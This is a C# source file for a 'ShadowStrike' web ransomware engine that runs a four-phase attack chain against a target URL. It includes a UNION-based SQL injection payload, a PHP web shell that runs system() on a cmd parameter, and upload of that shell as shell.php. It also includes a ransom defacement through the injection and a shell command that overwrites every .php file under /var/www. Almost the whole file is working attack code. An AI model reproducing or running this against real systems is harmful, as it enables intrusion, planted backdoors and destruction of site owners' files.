using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace ShadowStrike.Core
{
    public class WebRansomwareEngine
    {
        public event EventHandler<string> LogEvent;
        public event EventHandler<(string phase, bool success)> PhaseCompleteEvent;

        private HttpClient _httpClient;
        private string _targetUrl;
        private string _uploadEndpoint;
        private string _sqlEndpoint;
        private string _webShellUrl;

        public WebRansomwareEngine()
        {
            _httpClient = new HttpClient();
            _httpClient.Timeout = TimeSpan.FromSeconds(30);
        }

        public async Task ExecuteAttackAsync(string targetUrl, string ransomMessage = null)
        {
            _targetUrl = targetUrl.TrimEnd('/');
            Log("=== WEB RANSOMWARE KILL CHAIN INITIATED ===");
            Log($"Target: {_targetUrl}");
            Log("");

            // Phase 1: Reconnaissance
            bool reconSuccess = await Phase1_Reconnaissance();
            PhaseCompleteEvent?.Invoke(this, ("Reconnaissance", reconSuccess));
            
            if (!reconSuccess)
            {
                Log("ATTACK ABORTED: Target unreachable or protected.");
                return;
            }

            // Phase 2: Exploitation
            var exploitResults = await Phase2_Exploitation();
            PhaseCompleteEvent?.Invoke(this, ("Exploitation", exploitResults.sqliSuccess || exploitResults.uploadSuccess));

            // Phase 3: Persistence (if upload succeeded)
            bool persistenceSuccess = false;
            if (exploitResults.uploadSuccess)
            {
                persistenceSuccess = await Phase3_Persistence();
                PhaseCompleteEvent?.Invoke(this, ("Persistence", persistenceSuccess));
            }

            // Phase 4: Sabotage
            bool sabotageSuccess = await Phase4_Sabotage(exploitResults.sqliSuccess, persistenceSuccess, ransomMessage);
            PhaseCompleteEvent?.Invoke(this, ("Sabotage", sabotageSuccess));

            Log("");
            Log("=== ATTACK COMPLETE ===");
            if (sabotageSuccess)
            {
                Log("STATUS: Target compromised successfully.");
            }
            else
            {
                Log("STATUS: Partial compromise or attack failed.");
            }
        }

        private async Task<bool> Phase1_Reconnaissance()
        {
            Log("[PHASE 1] RECONNAISSANCE");
            Log("-----------------------------------");
            
            try
            {
                // Step 1: Check target accessibility
                Log("Checking target accessibility...");
                var response = await _httpClient.GetAsync(_targetUrl);
                
                if (!response.IsSuccessStatusCode)
                {
                    Log($"Target returned {response.StatusCode}. Aborting.");
                    return false;
                }
                
                Log($"✓ Target is accessible (Status: {response.StatusCode})");

                // Step 2: Technology fingerprinting (basic)
                Log("Fingerprinting server technology...");
                if (response.Headers.Contains("Server"))
                {
                    var serverHeader = response.Headers.GetValues("Server").FirstOrDefault();
                    Log($"✓ Server: {serverHeader}");
                }
                else
                {
                    Log("✓ Server header hidden (security measure detected)");
                }

                // Step 3: Discover attack endpoints
                Log("Mapping attack vectors...");
                _uploadEndpoint = $"{_targetUrl}/api/upload";
                _sqlEndpoint = $"{_targetUrl}/api/sql";
                
                Log($"✓ Upload endpoint: {_uploadEndpoint}");
                Log($"✓ SQL endpoint: {_sqlEndpoint}");
                
                Log("Reconnaissance complete.");
                return true;
            }
            catch (Exception ex)
            {
                Log($"✗ Reconnaissance failed: {ex.Message}");
                return false;
            }
        }

        private async Task<(bool sqliSuccess, bool uploadSuccess)> Phase2_Exploitation()
        {
            Log("");
            Log("[PHASE 2] EXPLOITATION");
            Log("-----------------------------------");
            
            bool sqliSuccess = false;
            bool uploadSuccess = false;

            // Attack Vector A: SQL Injection
            try
            {
                Log("Attempting SQL Injection...");
                var sqliPayload = "-1 UNION SELECT 'https://i.imgur.com/HACKED.jpg'";
                var sqliUrl = $"{_sqlEndpoint}?id={Uri.EscapeDataString(sqliPayload)}";
                
                var response = await _httpClient.GetAsync(sqliUrl);
                var content = await response.Content.ReadAsStringAsync();
                
                if (content.Contains("INJECTION_SUCCESS") || content.Contains("HACKED"))
                {
                    Log("✓ SQL Injection SUCCESSFUL - Database is vulnerable");
                    sqliSuccess = true;
                }
                else if (response.IsSuccessStatusCode)
                {
                    Log("✓ SQL Injection executed (response received, checking for markers)");
                    sqliSuccess = true;
                }
                else
                {
                    Log("✗ SQL Injection failed or blocked");
                }
            }
            catch (Exception ex)
            {
                Log($"✗ SQL Injection error: {ex.Message}");
            }

            // Attack Vector B: File Upload
            try
            {
                Log("Attempting malicious file upload...");
                
                var webShellContent = @"<?php
// ShadowStrike Web Shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
echo 'Shell Active';
?>";
                
                var content = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes(webShellContent));
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-php");
                content.Add(fileContent, "file", "shell.php");
                
                var response = await _httpClient.PostAsync(_uploadEndpoint, content);
                var responseText = await response.Content.ReadAsStringAsync();
                
                if (response.IsSuccessStatusCode && responseText.Contains("success"))
                {
                    Log("✓ File Upload SUCCESSFUL - Web shell deployed");
                    
                    // Extract the shell URL from response
                    if (responseText.Contains("url"))
                    {
                        var urlMatch = System.Text.RegularExpressions.Regex.Match(responseText, @"""url""\s*:\s*""([^""]+)""");
                        if (urlMatch.Success)
                        {
                            _webShellUrl = _targetUrl + urlMatch.Groups[1].Value;
                            Log($"✓ Web shell URL: {_webShellUrl}");
                        }
                    }
                    uploadSuccess = true;
                }
                else
                {
                    Log("✗ File upload failed or blocked");
                }
            }
            catch (Exception ex)
            {
                Log($"✗ File upload error: {ex.Message}");
            }

            Log($"Exploitation phase complete (SQLi: {sqliSuccess}, Upload: {uploadSuccess})");
            return (sqliSuccess, uploadSuccess);
        }

        private async Task<bool> Phase3_Persistence()
        {
            Log("");
            Log("[PHASE 3] PERSISTENCE");
            Log("-----------------------------------");
            
            if (string.IsNullOrEmpty(_webShellUrl))
            {
                Log("No web shell deployed, skipping persistence phase.");
                return false;
            }

            try
            {
                Log("Verifying web shell access...");
                var testUrl = $"{_webShellUrl}?cmd=echo%20test";
                var response = await _httpClient.GetAsync(testUrl);
                
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    Log("✓ Web shell is accessible and responsive");
                    Log("✓ Persistent backdoor established");
                    return true;
                }
                else
                {
                    Log("✗ Web shell verification failed");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Log($"✗ Persistence check failed: {ex.Message}");
                return false;
            }
        }

        private async Task<bool> Phase4_Sabotage(bool hasSqli, bool hasShell, string ransomMessage)
        {
            Log("");
            Log("[PHASE 4] SABOTAGE & RANSOM");
            Log("-----------------------------------");
            
            bool success = false;
            ransomMessage = ransomMessage ?? "YOUR WEBSITE HAS BEEN ENCRYPTED BY SHADOWSTRIKE";

            // Sabotage Method 1: SQL Injection Defacement
            if (hasSqli)
            {
                try
                {
                    Log("Executing database defacement via SQL Injection...");
                    var defacePayload = $"-1 UNION SELECT '{ransomMessage}'";
                    var defaceUrl = $"{_sqlEndpoint}?id={Uri.EscapeDataString(defacePayload)}";
                    
                    var response = await _httpClient.GetAsync(defaceUrl);
                    if (response.IsSuccessStatusCode)
                    {
                        Log("✓ Ransom message injected into database");
                        Log($"✓ All visitors will now see: {ransomMessage}");
                        success = true;
                    }
                }
                catch (Exception ex)
                {
                    Log($"✗ Database sabotage failed: {ex.Message}");
                }
            }

            // Sabotage Method 2: Web Shell Command Execution
            if (hasShell && !string.IsNullOrEmpty(_webShellUrl))
            {
                try
                {
                    Log("Executing sabotage commands via web shell...");
                    
                    // Simulate encryption command
                    var encryptCmd = "find /var/www -type f -name '*.php' -exec echo 'ENCRYPTED' > {} \\;";
                    var cmdUrl = $"{_webShellUrl}?cmd={Uri.EscapeDataString(encryptCmd)}";
                    
                    var response = await _httpClient.GetAsync(cmdUrl);
                    if (response.IsSuccessStatusCode)
                    {
                        Log("✓ File encryption command executed");
                        Log("✓ Critical application files compromised");
                        success = true;
                    }
                }
                catch (Exception ex)
                {
                    Log($"✗ Shell sabotage failed: {ex.Message}");
                }
            }

            if (!success)
            {
                Log("✗ Sabotage phase failed - no attack vector available");
            }

            return success;
        }

        private void Log(string message)
        {
            LogEvent?.Invoke(this, $"[{DateTime.Now:HH:mm:ss}] {message}");
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }
}
